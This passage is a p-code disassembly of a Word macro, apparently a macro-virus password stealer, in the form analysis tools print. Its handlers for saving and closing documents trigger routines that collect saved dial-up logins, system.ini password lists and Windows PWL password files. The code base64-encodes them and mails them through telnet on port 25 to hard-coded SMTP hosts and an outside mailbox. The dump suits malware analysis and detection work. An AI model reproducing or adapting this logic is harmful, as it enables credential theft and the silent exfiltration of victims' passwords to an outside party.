' 	FuncDefn (Sub FileSave())
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #95:
' 	ArgsCall Sender_main 0x0000 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub FileClose())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	ArgsCall AutoOpen 0x0000 
' Line #100:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub AutoClose())
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	ArgsCall AutoOpen 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub Tmsn())
' Line #107:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #108:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #109:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #110:
' 	Ld Friend 
' 	St NF 
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #113:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #114:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #115:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #116:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #117:
' 	Ld Delta 
' 	SelectCase 
' Line #118:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #119:
' 	ArgsCall Sender 0x0000 
' Line #120:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #121:
' 	ArgsCall Sender 0x0000 
' Line #122:
' 	CaseElse 
' Line #123:
' 	EndSelect 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Sub Sender())
' Line #126:
' 	Dim 
' 	VarDefn i (As Long)
' Line #127:
' 	LitDI2 0x0000 
' 	St i 
' Line #128:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0014 
' 	For 
' Line #129:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #130:
' 	ArgsCall Sender_main 0x0000 
' Line #131:
' 	ExitSub 
' Line #132:
' 	ElseBlock 
' Line #133:
' 	LitDI2 0x00FE 
' 	ArgsCall Pause 0x0001 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	StartForVariable 
' 	Next 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub Sender_main())
' Line #138:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #139:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #140:
' 	Dim 
' 	VarDefn hwnd (As Long)
' Line #141:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #142:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #143:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #144:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #145:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #146:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #147:
' 	Dim 
' 	VarDefn Title (As String)
' Line #148:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #149:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	VarDefn Host (As String)
' Line #150:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #151:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #152:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #153:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #154:
' 	Dim 
' 	VarDefn Twnd (As String)
' Line #155:
' 	Dim 
' 	VarDefn None (As String)
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #158:
' 	LitStr 0x000D "ns1.kazna.com"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' Line #159:
' 	LitStr 0x000E "mail.iname.com"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #160:
' 	LitStr 0x000E "194.186.182.26"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #161:
' 	LitStr 0x000C "195.75.32.20"
' 	LitDI2 0x0004 
' 	ArgsSt Host 0x0001 
' Line #162:
' 	LitStr 0x000F "lily.bas-net.by"
' 	LitDI2 0x0005 
' 	ArgsSt Host 0x0001 
' Line #163:
' 	LitStr 0x000C "212.19.17.57"
' 	LitDI2 0x0006 
' 	ArgsSt Host 0x0001 
' Line #164:
' 	LitStr 0x000F "itk2.bas-net.by"
' 	LitDI2 0x0007 
' 	ArgsSt Host 0x0001 
' Line #165:
' 	LitStr 0x0011 "imaph2.bas-net.by"
' 	LitDI2 0x0008 
' 	ArgsSt Host 0x0001 
' Line #166:
' 	LitStr 0x000C "tuna.fsr.com"
' 	LitDI2 0x0009 
' 	ArgsSt Host 0x0001 
' Line #167:
' 	LitStr 0x000F "redfish.fsr.com"
' 	LitDI2 0x000A 
' 	ArgsSt Host 0x0001 
' Line #168:
' 	LitDI2 0x000A 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #169:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #170:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #171:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #172:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #173:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #174:
' 	ElseBlock 
' Line #175:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Òåëíåò - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #176:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #177:
' 	LitStr 0x0006 "Òåëíåò"
' 	St Twnd 
' Line #178:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #179:
' 	ElseBlock 
' Line #180:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Telnet - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #181:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #182:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	EndIfBlock 
' Line #185:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #186:
' 	ArgsCall DoEvents 0x0000 
' Line #187:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #188:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #189:
' 	ArgsCall DoEvents 0x0000 
' Line #190:
' 	Ld Timer 
' 	St Start 
' Line #191:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0046 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #192:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #193:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Connect failed"
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #194:
' 	ArgsCall DoEvents 0x0000 
' Line #195:
' 	Loop 
' Line #196:
' 	Ld Handle 
' 	SelectCase 
' Line #197:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #198:
' 	LineCont 0x0008 04 00 01 00 0B 00 01 00
' 	LitStr 0x0054 "helo orck1#$$mail from: <master@myself.com>#$rcpt to: <kashek@usa.net>#$data#$Date: "
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0080 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "----=_NextPart"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0084 "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
' 	Add 
' 	St SMTP 
' Line #199:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #200:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #201:
' 	Ld FileName 
' 	ArgsCall Grab 0x0001 
' Line #202:
' 	Ld FileName 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #203:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FileName 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #204:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #205:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #206:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #207:
' 	Ld i 
' 	ArgsLd NPwl 0x0000 
' 	ArgsCall FindPWL 0x0002 
' Line #208:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #209:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #210:
' 	LitStr 0x000B "c:\windows\"
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x02B0 
' 	Ne 
' 	IfBlock 
' Line #211:
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #212:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #213:
' 	LineCont 0x000C 08 00 03 00 15 00 03 00 1B 00 03 00
' 	LitStr 0x003F "#------=_NextPart#Content-Type: application/octet-stream; name="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0038 "#Content-Transfer-Encoding: base64#Content-Description: "
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitStr 0x003E "(PWL PassWord List)#Content-Disposition: attachment; filename="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Title 
' Line #214:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #215:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #216:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #217:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	StartForVariable 
' 	Next 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	LitStr 0x001D "##------=_NextPart--#.#$quit#"
' 	St Title 
' Line #222:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #223:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #224:
' 	Ld Timer 
' 	St Start 
' Line #225:
' 	Ld hwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #226:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hwnd 
' Line #227:
' 	ArgsCall DoEvents 0x0000 
' Line #228:
' 	Loop 
' Line #229:
' 	Ld hwnd 
' 	SelectCase 
' Line #230:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #231:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #232:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #233:
' 	CaseElse 
' Line #234:
' 	Ld hwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #235:
' 	Ld Friend 
' 	St NF 
' Line #236:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #237:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #238:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #239:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #240:
' 	ArgsCall DoEvents 0x0000 
' Line #241:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #242:
' 	ExitSub 
' Line #243:
' 	EndSelect 
' Line #244:
' 	CaseElse 
' Line #245:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #246:
' 	Ld HandleBW 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #247:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #248:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #249:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #250:
' 	LitDI2 0x0000 
' 	St HandleBW 
' Line #251:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #252:
' 	EndSelect 
' Line #253:
' 	StartForVariable 
' 	Next 
' Line #254:
' 	EndIfBlock 
' Line #255:
' 	EndSub 
' Line #256:
' 	FuncDefn (Function Check_Connection())
' Line #257:
' 	Dim 
' 	VarDefn CurrWnd (As Long)
' Line #258:
' 	Dim 
' 	VarDefn Length (As Long)
' Line #259:
' 	Dim 
' 	VarDefn Title (As String)
' Line #260:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St CurrWnd 
' Line #261:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #262:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #263:
' 	Ld CurrWnd 
' 	ArgsLd GetWindowTextLength 0x0001 
' 	St Length 
' Line #264:
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Space 0x0001 
' 	St Title 
' Line #265:
' 	Ld CurrWnd 
' 	Ld Title 
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd GetWindowText 0x0003 
' 	St Length 
' Line #266:
' 	LineCont 0x0004 0D 00 05 00
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Connected to"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Ïîäêëþ÷åíî ê"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #267:
' 	LitVarSpecial (True)
' 	St Check_Connection 
' Line #268:
' 	ExitFunc 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	Ld CurrWnd 
' 	LitDI2 0x0002 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #271:
' 	ArgsCall DoEvents 0x0000 
' Line #272:
' 	Loop 
' Line #273:
' 	LitVarSpecial (False)
' 	St Check_Connection 
' Line #274:
' 	EndFunc 
' Line #275:
' Line #276:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #277:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #278:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #279:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #280:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #281:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #282:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #283:
' 	StartForVariable 
' 	Next 
' Line #284:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #285:
' 	ArgsCall Read 0x0000 
' Line #286:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #287:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #288:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #289:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #290:
' 	StartForVariable 
' 	Next 
' Line #291:
' 	EndFunc 
' Line #292:
' Line #293:
' 	FuncDefn (Sub Filler(MessStr As String, hwnd As Long))
' Line #294:
' 	Dim 
' 	VarDefn i (As Long)
' Line #295:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #296:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #297:
' 	OnError (Resume Next) 
' Line #298:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #299:
' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #300:
' 	Ld Tmp 
' 	SelectCase 
' Line #301:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #302:
' 	ArgsCall DoEvents 0x0000 
' Line #303:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #304:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #305:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #306:
' 	CaseElse 
' Line #307:
' 	Ld i 
' 	LitDI2 0x017C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #308:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #309:
' 	EndIfBlock 
' Line #310:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #311:
' 	EndSelect 
' Line #312:
' 	StartForVariable 
' 	Next 
' Line #313:
' 	EndSub 
' Line #314:
' Line #315:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #316:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #317:
' 	Ld Timer 
' 	St Start 
' Line #318:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #319:
' 	ArgsCall DoEvents 0x0000 
' Line #320:
' 	Loop 
' Line #321:
' 	EndSub 
' Line #322:
' Line #323:
' 	FuncDefn (Function Grab(New As String))
' Line #324:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #325:
' 	Dim 
' 	VarDefn AZ (As String)
' Line #326:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #327:
' 	Dim 
' 	VarDefn Num (As Integer)
' Line #328:
' 	Dim 
' 	VarDefn PwdLst (As String)
' Line #329:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #330:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #331:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #332:
' 	Dim 
' 	VarDefn NF1 (As Integer)
' Line #333:
' 	LitStr 0x001A "abcdifghijklmnopqastuvwxyz"
' 	St AZ 
' Line #334:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #335:
' 	LitDI2 0x0019 
' 	ArgsLd Random1 0x0001 
' 	St Num 
' Line #336:
' 	Ld New 
' 	Ld AZ 
' 	Ld Num 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St New 
' Line #337:
' 	StartForVariable 
' 	Next 
' Line #338:
' 	Ld New 
' 	LitStr 0x0004 ".egn"
' 	Add 
' 	St New 
' Line #339:
' 	OnError (Resume Next) 
' Line #340:
' 	Ld Friend 
' 	St NF1 
' Line #341:
' 	LitStr 0x000B "c:\windows\"
' 	Ld New 
' 	Add 
' 	Ld NF1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #342:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #343:
' 	Ld Friend 
' 	St NF 
' Line #344:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #345:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #346:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #347:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #348:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld Tmp 
' 	PrintItemNL 
' Line #349:
' 	EndIfBlock 
' Line #350:
' 	Loop 
' Line #351:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #352:
' 	EndIfBlock 
' Line #353:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #354:
' 	Ld Friend 
' 	St NF 
' Line #355:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #356:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #357:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #358:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #359:
' 	Ld Temp 
' 	LitStr 0x0010 "[Password Lists]"
' 	Eq 
' 	IfBlock 
' Line #360:
' 	Ld Temp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #361:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #362:
' 	Ld PwdLst 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Temp 
' 	Add 
' 	St PwdLst 
' Line #363:
' 	Loop 
' Line #364:
' 	ExitDo 
' Line #365:
' 	EndIfBlock 
' Line #366:
' 	Ld Counter 
' 	LitDI2 0x0014 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #367:
' 	ArgsCall DoEvents 0x0000 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	Loop 
' Line #370:
' 	EndIfBlock 
' Line #371:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #372:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld PwdLst 
' 	PrintItemNL 
' Line #373:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	ArgsLd Grab_Registr_main 0x0000 
' 	PrintItemNL 
' Line #374:
' 	Ld NF1 
' 	Sharp 
' 	Close 0x0001 
' Line #375:
' 	EndFunc 
' Line #376:
' Line #377:
' 	FuncDefn (Function Base64(FName As String))
' Line #378:
' 	Dim 
' 	VarDefn i (As Long)
' Line #379:
' 	Dim 
' 	VarDefn ABC (As String)
' Line #380:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #381:
' 	Dim 
' 	VarDefn Char (As Byte)
' Line #382:
' 	Dim 
' 	VarDefn Cod (As Integer)
' Line #383:
' 	Dim 
' 	VarDefn Roll (As Integer)
' Line #384:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #385:
' 	QuoteRem 0x0000 0x0000 ""
' Line #386:
' 	Dim 
' 	VarDefn HMask (As Integer)
' Line #387:
' 	Dim 
' 	VarDefn LMask (As Integer)
' Line #388:
' 	Dim 
' 	VarDefn Shift (As Integer)
' Line #389:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #390:
' Line #391:
' Line #392:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #393:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #394:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #395:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #396:
' 	LitDI2 0x0001 
' 	St Counter 
' Line #397:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St ABC 
' Line #398:
' 	Ld Friend 
' 	St NF 
' Line #399:
' 	OnError (Resume Next) 
' Line #400:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FName 
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #401:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #402:
' 	Ld NF 
' 	Sharp 
' 	Ld Counter 
' 	Ld Char 
' 	GetRec 
' Line #403:
' 	Ld Char 
' 	Ld HMask 
' 	And 
' 	Paren 
' 	Ld LMask 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	IDiv 
' 	Paren 
' 	Ld Roll 
' 	Or 
' 	St Cod 
